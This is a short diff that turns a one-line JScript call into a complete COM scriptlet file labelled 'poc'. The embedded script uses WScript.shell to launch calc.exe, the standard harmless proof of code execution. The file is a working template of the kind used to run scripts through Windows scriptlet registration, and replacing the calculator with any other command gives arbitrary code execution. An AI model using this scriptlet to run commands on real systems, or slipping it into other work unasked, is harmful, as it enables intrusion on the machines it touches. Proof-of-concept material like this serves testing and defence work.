@@ -1,1 +1,13 @@
-var r = new ActiveXObject("WScript.shell").Run("calc.exe");
+<?XML version="1.0"?>
+<scriptlet>
+<registration>
+    progid="poc"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
+        <script language="Jscript">
+        <![CDATA[
+            var r = new ActiveXObject("WScript.shell").Run("calc.exe");
+        ]]>
+</script>
+</registration>
+</scriptlet>
+      
